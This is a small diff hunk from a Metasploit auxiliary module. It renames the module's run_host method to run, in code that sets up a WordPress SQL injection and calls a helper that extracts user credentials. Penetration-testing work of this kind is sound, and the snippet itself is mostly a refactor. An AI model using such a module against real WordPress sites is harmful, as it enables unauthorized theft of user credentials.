@@ -94,7 +94,7 @@ class MetasploitModule < Msf::Auxiliary
     Exploit::CheckCode::Safe
   end
 
-  def run_host(_ip)
+  def run
     @sqli ||= get_sqli_object
     wordpress_sqli_initialize(@sqli)
     wordpress_sqli_get_users_credentials(datastore['COUNT'])
